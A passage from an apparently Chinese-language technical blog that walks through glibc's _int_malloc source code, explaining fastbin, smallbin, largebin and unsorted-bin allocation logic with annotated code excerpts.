class="line"> <span class="comment">/* There are no usable arenas.  Fall back to sysmalloc to get a chunk from</span></span><br><span class="line"><span class="comment">    mmap.  */</span></span><br><span class="line"> <span class="keyword">if</span> (__glibc_unlikely (av == <span class="literal">NULL</span>))</span><br><span class="line">   &#123;</span><br><span class="line">     <span class="type">void</span> *p = sysmalloc (nb, av);</span><br><span class="line">     <span class="keyword">if</span> (p != <span class="literal">NULL</span>)</span><br><span class="line">alloc_perturb (p, bytes);</span><br><span class="line">     <span class="keyword">return</span> p;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> REQUEST_OUT_OF_RANGE(req)                                 \</span></span><br><span class="line"><span class="meta">  ((unsigned long) (req) &gt;=      \</span></span><br><span class="line"><span class="meta">   (unsigned long) (INTERNAL_SIZE_T) (-2 * MINSIZE))</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* pad request bytes into a usable size -- internal version */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> request2size(req)                                         \</span></span><br><span class="line"><span class="meta">  (((req) + SIZE_SZ + MALLOC_ALIGN_MASK &lt; MINSIZE)  ?             \</span></span><br><span class="line"><span class="meta">   MINSIZE :                                                      \</span></span><br><span class="line"><span class="meta">   ((req) + SIZE_SZ + MALLOC_ALIGN_MASK) &amp; ~MALLOC_ALIGN_MASK)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*  Same, except also perform argument check */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> checked_request2size(req, sz)                             \</span></span><br><span class="line"><span class="meta">  <span class="keyword">if</span> (REQUEST_OUT_OF_RANGE (req)) &#123;      \</span></span><br><span class="line"><span class="meta">      __set_errno (ENOMEM);      \</span></span><br><span class="line"><span class="meta">      return 0;      \</span></span><br><span class="line"><span class="meta">    &#125;      \</span></span><br><span class="line"><span class="meta">  (sz) = request2size (req);</span></span><br></pre></td></tr></table></figure><p>检查申请大小是否合规并转化为真正的chunksize</p><p>虽然代码上是先检查申请大小是否合规再将其转化为chunksize,但真正运行中更多时候顺序是反过来的</p><p>如果arena是NULL采用mmap分配并返回</p><h4 id="fastbin-FILO"><a href="#fastbin-FILO" class="headerlink" title="fastbin(FILO)"></a>fastbin(FILO)</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ((<span class="type">unsigned</span> <span class="type">long</span>) (nb) &lt;= (<span class="type">unsigned</span> <span class="type">long</span>) (get_max_fast ()))</span><br><span class="line">  &#123;</span><br><span class="line">    idx = fastbin_index (nb); <span class="comment">//计算出索引</span></span><br><span class="line">    mfastbinptr *fb = &amp;fastbin (av, idx);<span class="comment">//获得单链表头节点</span></span><br><span class="line">    mchunkptr pp = *fb;<span class="comment">//获得第一个chunk</span></span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">      &#123;</span><br><span class="line">        victim = pp;</span><br><span class="line">        <span class="keyword">if</span> (victim == <span class="literal">NULL</span>)</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    <span class="keyword">while</span> ((pp = catomic_compare_and_exchange_val_acq (fb, victim-&gt;fd, victim))</span><br><span class="line">           != victim);</span><br><span class="line">    <span class="keyword">if</span> (victim != <span class="number">0</span>)</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> (__builtin_expect (fastbin_index (chunksize (victim)) != idx, <span class="number">0</span>))<span class="comment">//检查</span></span><br><span class="line">          &#123;</span><br><span class="line">            errstr = <span class="string">&quot;malloc(): memory corruption (fast)&quot;</span>;</span><br><span class="line">          errout:</span><br><span class="line">            malloc_printerr (check_action, errstr, chunk2mem (victim), av);</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">          &#125;</span><br><span class="line">        check_remalloced_chunk (av, victim, nb);</span><br><span class="line">        <span class="type">void</span> *p = chunk2mem (victim);<span class="comment">//chunk2mem转换地址</span></span><br><span class="line">        alloc_perturb (p, bytes);</span><br><span class="line">        <span class="keyword">return</span> p;<span class="comment">//返回</span></span><br><span class="line">      &#125;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>通过宏fastbin_index(sz)得到对应的fastbin索引</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> fastbin_index(sz) \</span></span><br><span class="line"><span class="meta">  ((((unsigned int) (sz)) &gt;&gt; (SIZE_SZ == 8 ? 4 : 3)) - 2)</span></span><br></pre></td></tr></table></figure><p>然后拿到该索引链的地址</p><p>victim赋值为该链的第一个chunk</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">do</span></span><br><span class="line">  &#123;</span><br><span class="line">    victim = pp;</span><br><span class="line">    <span class="keyword">if</span> (victim == <span class="literal">NULL</span>)</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">  &#125;</span><br><span class="line"><span class="keyword">while</span> ((pp = catomic_compare_and_exchange_val_acq (fb, victim-&gt;fd, victim))</span><br><span class="line">       != victim);</span><br></pre></td></tr></table></figure><p>其中用到了一些原子操作</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> atomic_compare_and_exchange_val_acq(mem, newval, oldval) \</span></span><br><span class="line"><span class="meta">  (&#123; __typeof (mem) __gmemp = (mem);      \</span></span><br><span class="line"><span class="meta">     __typeof (*mem) __gret = *__gmemp;      \</span></span><br><span class="line"><span class="meta">     __typeof (*mem) __gnewval = (newval);      \</span></span><br><span class="line"><span class="meta">      \</span></span><br><span class="line"><span class="meta">     <span class="keyword">if</span> (__gret == (oldval))      \</span></span><br><span class="line"><span class="meta">       *__gmemp = __gnewval;      \</span></span><br><span class="line"><span class="meta">     __gret; &#125;)</span></span><br></pre></td></tr></table></figure><p>就是比较mem指向的值是否等于oldval,如果等于则将mem指向的值变为newval,并返回oldval</p><p>如果victim不为NULL,检查其大小计算得出的索引是否符合当前索引链</p><p>最后有个检查调用<code>check_remalloced_chunk (av, victim, nb);</code></p><p>但因为宏编译的一些变量,它一般是空代码</p><h4 id="smallbin-FIFO"><a href="#smallbin-FIFO" class="headerlink" title="smallbin(FIFO)"></a>smallbin(FIFO)</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"> <span class="keyword">if</span> (in_smallbin_range (nb))</span><br><span class="line">   &#123;</span><br><span class="line">     idx = smallbin_index (nb);<span class="comment">//计算索引</span></span><br><span class="line">     bin = bin_at (av, idx);<span class="comment">//初始化链表头</span></span><br><span class="line"></span><br><span class="line">     <span class="keyword">if</span> ((victim = last (bin)) != bin)<span class="comment">//检测链为空</span></span><br><span class="line">       &#123;</span><br><span class="line">         <span class="keyword">if</span> (victim == <span class="number">0</span>) <span class="comment">/* initialization check */</span></span><br><span class="line">           malloc_consolidate (av);</span><br><span class="line">         <span class="keyword">else</span></span><br><span class="line">           &#123;</span><br><span class="line">             bck = victim-&gt;bk;</span><br><span class="line"><span class="keyword">if</span> (__glibc_unlikely (bck-&gt;fd != victim))</span><br><span class="line">               &#123;</span><br><span class="line">                 errstr = <span class="string">&quot;malloc(): smallbin double linked list corrupted&quot;</span>;</span><br><span class="line">                 <span class="keyword">goto</span> errout;</span><br><span class="line">               &#125;</span><br><span class="line">             set_inuse_bit_at_offset (victim, nb);<span class="comment">//设置下一个chunk的p位</span></span><br><span class="line">             bin-&gt;bk = bck;</span><br><span class="line">             bck-&gt;fd = bin;</span><br><span class="line"></span><br><span class="line">             <span class="keyword">if</span> (av != &amp;main_arena)</span><br><span class="line">               victim-&gt;size |= NON_MAIN_ARENA;<span class="comment">//设置A位</span></span><br><span class="line">             check_malloced_chunk (av, victim, nb);</span><br><span class="line">             <span class="type">void</span> *p = chunk2mem (victim);</span><br><span class="line">             alloc_perturb (p, bytes);</span><br><span class="line">             <span class="keyword">return</span> p;<span class="comment">//返回</span></span><br><span class="line">           &#125;</span><br><span class="line">       &#125;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><p>如果当前链不为空才进入分配</p><ol><li>如果是因为堆未初始化导致的误判链不为空,触发malloc_consolidate (av);</li><li>否则取出</li></ol><h4 id="largebin-FIFO"><a href="#largebin-FIFO" class="headerlink" title="largebin(FIFO)"></a>largebin(FIFO)</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    idx = largebin_index (nb);</span><br><span class="line">    <span class="keyword">if</span> (have_fastchunks (av))</span><br><span class="line">      malloc_consolidate (av);</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>可以看到,申请largebin时,并不会直接进入largebin中寻找,而是会:</p><ol><li>判断是否有fastchunk,是则触发malloc_consolidate (av);</li><li>进入unsortedbin遍历循环,找到则返回</li><li>进入largebin分配</li></ol><h4 id="大循环"><a href="#大循环" class="headerlink" title="大循环"></a>大循环</h4><p>接下来几个部分,都是这个大循环的一部分</p><h4 id="unsortedbin-FIFO-遍历"><a href="#unsortedbin-FIFO-遍历" class="headerlink" title="unsortedbin(FIFO)遍历"></a>unsortedbin(FIFO)遍历</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br></pre></td><td class="code"><pre><span class="line">      <span class="keyword">while</span> ((victim = unsorted_chunks (av)-&gt;bk) != unsorted_chunks (av))</span><br><span class="line">        &#123;</span><br><span class="line">          bck = victim-&gt;bk;</span><br><span class="line">          <span class="keyword">if</span> (__builtin_expect (victim-&gt;size &lt;= <span class="number">2</span> * SIZE_SZ, <span class="number">0</span>)</span><br><span class="line">              || __builtin_expect (victim-&gt;size &gt; av-&gt;system_mem, <span class="number">0</span>))</span><br><span class="line">            malloc_printerr (check_action, <span class="string">&quot;malloc(): memory corruption&quot;</span>,</span><br><span class="line">                             chunk2mem (victim), av);</span><br><span class="line">          size = chunksize (victim);</span><br><span class="line"></span><br><span class="line">          <span class="comment">/*</span></span><br><span class="line"><span class="comment">             If a small request, try to use last remainder if it is the</span></span><br><span class="line"><span class="comment">             only chunk in unsorted bin.  This helps promote locality for</span></span><br><span class="line"><span class="comment">             runs of consecutive small requests. This is the only</span></span><br><span class="line"><span class="comment">             exception to best-fit, and applies only when there is</span></span><br><span class="line"><span class="comment">             no exact fit for a small chunk.</span></span><br><span class="line"><span class="comment">           */</span></span><br><span class="line"></span><br><span class="line">          <span class="keyword">if</span> (in_smallbin_range (nb) &amp;&amp;</span><br><span class="line">              bck == unsorted_chunks (av) &amp;&amp;<span class="comment">//当满足nb为smallbin范围,且unsorted中只有一个last_remainer时</span></span><br><span class="line">              victim == av-&gt;last_remainder &amp;&amp;</span><br><span class="line">              (<span class="type">unsigned</span> <span class="type">long</span>) (size) &gt; (<span class="type">unsigned</span> <span class="type">long</span>) (nb + MINSIZE))</span><br><span class="line">            &#123;</span><br><span class="line">              <span class="comment">/* split and reattach remainder */</span></span><br><span class="line">              remainder_size = size - nb;</span><br><span class="line">              remainder = chunk_at_offset (victim, nb);</span><br><span class="line">              unsorted_chunks (av)-&gt;bk = unsorted_chunks (av)-&gt;fd = remainder;</span><br><span class="line">              av-&gt;last_remainder = remainder;</span><br><span class="line">              remainder-&gt;bk = remainder-&gt;fd = unsorted_chunks (av);</span><br><span class="line">              <span class="keyword">if</span> (!in_smallbin_range (remainder_size))</span><br><span class="line">                &#123;</span><br><span class="line">                  remainder-&gt;fd_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">                  remainder-&gt;bk_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">              set_head (victim, nb | PREV_INUSE |</span><br><span class="line">                        (av != &amp;main_arena ? NON_MAIN_ARENA : <span class="number">0</span>));</span><br><span class="line">              set_head (remainder, remainder_size | PREV_INUSE);</span><br><span class="line">              set_foot (remainder, remainder_size);</span><br><span class="line"></span><br><span class="line">              check_malloced_chunk (av, victim, nb);</span><br><span class="line">              <span class="type">void</span> *p = chunk2mem (victim);</span><br><span class="line">              alloc_perturb (p, bytes);</span><br><span class="line">              <span class="keyword">return</span> p;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">          <span class="comment">/* remove from unsorted list */</span></span><br><span class="line">          unsorted_chunks (av)-&gt;bk = bck;</span><br><span class="line">          bck-&gt;fd = unsorted_chunks (av);</span><br><span class="line"></span><br><span class="line">          <span class="comment">/* Take now instead of binning if exact fit */</span></span><br><span class="line"></span><br><span class="line">          <span class="keyword">if</span> (size == nb)</span><br><span class="line">            &#123;</span><br><span class="line">              set_inuse_bit_at_offset (victim, size);</span><br><span class="line">              <span class="keyword">if</span> (av != &amp;main_arena)</span><br><span class="line">                victim-&gt;size |= NON_MAIN_ARENA;</span><br><span class="line">              check_malloced_chunk (av, victim, nb);</span><br><span class="line">              <span class="type">void</span> *p = chunk2mem (victim);</span><br><span class="line">              alloc_perturb (p, bytes);   <span class="comment">//刚好相等</span></span><br><span class="line">              <span class="keyword">return</span> p;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">          <span class="comment">/* place chunk in bin */</span></span><br><span class="line"></span><br><span class="line">          <span class="keyword">if</span> (in_smallbin_range (size))</span><br><span class="line">            &#123;</span><br><span class="line">              victim_index = smallbin_index (size);</span><br><span class="line">              bck = bin_at (av, victim_index);</span><br><span class="line">              fwd = bck-&gt;fd;  <span class="comment">//放入smallbin</span></span><br><span class="line">            &#125;</span><br><span class="line">          <span class="keyword">else</span><span class="comment">//放入largebin</span></span><br><span class="line">            &#123;</span><br><span class="line">              victim_index = largebin_index (size);</span><br><span class="line">              bck = bin_at (av, victim_index);</span><br><span class="line">              fwd = bck-&gt;fd;</span><br><span class="line"></span><br><span class="line">              <span class="comment">/* maintain large bins in sorted order */</span></span><br><span class="line">              <span class="keyword">if</span> (fwd != bck)</span><br><span class="line">                &#123;</span><br><span class="line">                  <span class="comment">/* Or with inuse bit to speed comparisons */</span></span><br><span class="line">                  size |= PREV_INUSE;</span><br><span class="line">                  <span class="comment">/* if smaller than smallest, bypass loop below */</span></span><br><span class="line">                  assert ((bck-&gt;bk-&gt;size &amp; NON_MAIN_ARENA) == <span class="number">0</span>);</span><br><span class="line">                  <span class="keyword">if</span> ((<span class="type">unsigned</span> <span class="type">long</span>) (size) &lt; (<span class="type">unsigned</span> <span class="type">long</span>) (bck-&gt;bk-&gt;size))<span class="comment">//小于最小的</span></span><br><span class="line">                    &#123;</span><br><span class="line">                      fwd = bck;</span><br><span class="line">                      bck = bck-&gt;bk;</span><br><span class="line"></span><br><span class="line">                      victim-&gt;fd_nextsize = fwd-&gt;fd;</span><br><span class="line">                      victim-&gt;bk_nextsize = fwd-&gt;fd-&gt;bk_nextsize;</span><br><span class="line">                      fwd-&gt;fd-&gt;bk_nextsize = victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</span><br><span class="line">                    &#125;</span><br><span class="line">                  <span class="keyword">else</span></span><br><span class="line">                    &#123;</span><br><span class="line">                      assert ((fwd-&gt;size &amp; NON_MAIN_ARENA) == <span class="number">0</span>);<span class="comment">//从大的开始遍历</span></span><br><span class="line">                      <span class="keyword">while</span> ((<span class="type">unsigned</span> <span class="type">long</span>) size &lt; fwd-&gt;size)</span><br><span class="line">                        &#123;</span><br><span class="line">                          fwd = fwd-&gt;fd_nextsize;</span><br><span class="line">                          assert ((fwd-&gt;size &amp; NON_MAIN_ARENA) == <span class="number">0</span>);</span><br><span class="line">                        &#125;</span><br><span class="line"></span><br><span class="line">                      <span class="keyword">if</span> ((<span class="type">unsigned</span> <span class="type">long</span>) size == (<span class="type">unsigned</span> <span class="type">long</span>) fwd-&gt;size)</span><br><span class="line">                        <span class="comment">/* Always insert in the second position.  */</span></span><br><span class="line">                        fwd = fwd-&gt;fd;<span class="comment">//永远插在第一个相同大小的后一个位置,不理会nextsize链</span></span><br><span class="line">                      <span class="keyword">else</span></span><br><span class="line">                        &#123;</span><br><span class="line">                          victim-&gt;fd_nextsize = fwd;<span class="comment">//fd_nextsize指向最近的更小的chunk</span></span><br><span class="line">                          victim-&gt;bk_nextsize = fwd-&gt;bk_nextsize;<span class="comment">//fwd肯定在nextsize链,尾除外</span></span><br><span class="line">                          fwd-&gt;bk_nextsize = victim;</span><br><span class="line">                          victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</span><br><span class="line">                        &#125;</span><br><span class="line">                      bck = fwd-&gt;bk;<span class="comment">//上一个设置为nextsize链上的</span></span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">              <span class="keyword">else</span></span><br><span class="line">                victim-&gt;fd_nextsize = victim-&gt;bk_nextsize = victim;<span class="comment">//largebin为空</span></span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">          mark_bin (av, victim_index);<span class="comment">//标记binmap</span></span><br><span class="line">          victim-&gt;bk = bck;</span><br><span class="line">          victim-&gt;fd = fwd;</span><br><span class="line">          fwd-&gt;bk = victim;</span><br><span class="line">          bck-&gt;fd = victim;<span class="comment">//链条完整</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MAX_ITERS       10000</span></span><br><span class="line">          <span class="keyword">if</span> (++iters &gt;= MAX_ITERS)<span class="comment">//最多循环10000次</span></span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure><p>遍历只有当完成处理10000次或者unsorted已空才退出</p><ol><li>对victim的size进行检查</li><li>当申请大小处于smallbin范围&amp;&amp;victim为unsortedbin中最后一个chunk&amp;&amp;victim为last_remainer&amp;&amp;size大于申请大小+min_size,采用last_remainer分配</li><li>将victim移除unsorted</li><li>如果size刚好则直接返回</li><li>否则进行进入bin的成链准备</li><li>标志binmap,并彻底成链,unsorted遍历也是唯一一会mark_bin处</li></ol><h4 id="遍历后largebin分配"><a href="#遍历后largebin分配" class="headerlink" title="遍历后largebin分配"></a>遍历后largebin分配</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line">   <span class="keyword">if</span> (!in_smallbin_range (nb))</span><br><span class="line">     &#123;</span><br><span class="line">       bin = bin_at (av, idx);</span><br><span class="line"></span><br><span class="line">       <span class="comment">/* skip scan if empty or largest chunk is too small */</span></span><br><span class="line">       <span class="keyword">if</span> ((victim = first (bin)) != bin &amp;&amp;<span class="comment">//不为空</span></span><br><span class="line">           (<span class="type">unsigned</span> <span class="type">long</span>) (victim-&gt;size) &gt;= (<span class="type">unsigned</span> <span class="type">long</span>) (nb))<span class="comment">//最大的大于需要的才进入</span></span><br><span class="line">         &#123;</span><br><span class="line">           victim = victim-&gt;bk_nextsize;<span class="comment">//从小的开始找</span></span><br><span class="line">           <span class="keyword">while</span> (((<span class="type">unsigned</span> <span class="type">long</span>) (size = chunksize (victim)) &lt;</span><br><span class="line">                   (<span class="type">unsigned</span> <span class="type">long</span>) (nb)))</span><br><span class="line">             victim = victim-&gt;bk_nextsize;</span><br><span class="line"></span><br><span class="line">           <span class="comment">/* Avoid removing the first entry for a size so that the skip</span></span><br><span class="line"><span class="comment">              list does not have to be rerouted.  */</span></span><br><span class="line">           <span class="keyword">if</span> (victim != last (bin) &amp;&amp; victim-&gt;size == victim-&gt;fd-&gt;size)</span><br><span class="line">             victim = victim-&gt;fd;<span class="comment">//尽量不取出nextsize链上的chunk</span></span><br><span class="line"></span><br><span class="line">           remainder_size = size - nb;</span><br><span class="line">           unlink (av, victim, bck, fwd);<span class="comment">//unlink会设置victim的nextsize链</span></span><br><span class="line"></span><br><span class="line">           <span class="comment">/* Exhaust */</span></span><br><span class="line">           <span class="keyword">if</span> (remainder_size &lt; MINSIZE)<span class="comment">//这种情况连多余部分一起分配</span></span><br><span class="line">             &#123;</span><br><span class="line">               set_inuse_bit_at_offset (victim, size);</span><br><span class="line">               <span class="keyword">if</span> (av != &amp;main_arena)</span><br><span class="line">                 victim-&gt;size |= NON_MAIN_ARENA;</span><br><span class="line">             &#125;</span><br><span class="line">           <span class="comment">/* Split */</span></span><br><span class="line">           <span class="keyword">else</span></span><br><span class="line">             &#123;</span><br><span class="line">               remainder = chunk_at_offset (victim, nb);</span><br><span class="line">               <span class="comment">/* We cannot assume the unsorted list is empty and therefore</span></span><br><span class="line"><span class="comment">                  have to perform a complete insert here.  */</span></span><br><span class="line">               bck = unsorted_chunks (av);</span><br><span class="line">               fwd = bck-&gt;fd;</span><br><span class="line"><span class="keyword">if</span> (__glibc_unlikely (fwd-&gt;bk != bck))</span><br><span class="line">                 &#123;</span><br><span class="line">                   errstr = <span class="string">&quot;malloc(): corrupted unsorted chunks&quot;</span>;</span><br><span class="line">                   <span class="keyword">goto</span> errout;</span><br><span class="line">                 &#125;</span><br><span class="line">               remainder-&gt;bk = bck;</span><br><span class="line">               remainder-&gt;fd = fwd;</span><br><span class="line">               bck-&gt;fd = remainder;</span><br><span class="line">               fwd-&gt;bk = remainder;</span><br><span class="line">               <span class="keyword">if</span> (!in_smallbin_range (remainder_size))</span><br><span class="line">                 &#123;</span><br><span class="line">                   remainder-&gt;fd_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">                   remainder-&gt;bk_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">                 &#125;</span><br><span class="line">               set_head (victim, nb | PREV_INUSE |</span><br><span class="line">                         (av != &amp;main_arena ? NON_MAIN_ARENA : <span class="number">0</span>));<span class="comment">//设置取出部分</span></span><br><span class="line">               set_head (remainder, remainder_size | PREV_INUSE);</span><br><span class="line">               set_foot (remainder, remainder_size);<span class="comment">//设置remainder</span></span><br><span class="line">             &#125;</span><br><span class="line">           check_malloced_chunk (av, victim, nb);</span><br><span class="line">           <span class="type">void</span> *p = chunk2mem (victim);</span><br><span class="line">           alloc_perturb (p, bytes);</span><br><span class="line">           <span class="keyword">return</span> p;<span class="comment">//返回</span></span><br><span class="line">         &#125;</span><br><span class="line">     &#125;</span><br></pre></td></tr></table></figure><p>如果对应链不为空且最大的chunk大于申请大小才进入分配</p><ol><li>从最小的开始找起,直到找到第一个比所需大小更大的</li><li>如果有相同大小的chunk,尽量不拿取nextsize链上的</li><li>unlink</li><li>正常流程切割,切割时如果remainer_size小于min_size则连remainer部分一起分配,否则的话切割还要多写一些信息</li></ol><h4 id="binmap情况"><a href="#binmap情况" class="headerlink" title="binmap情况"></a>binmap情况</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span 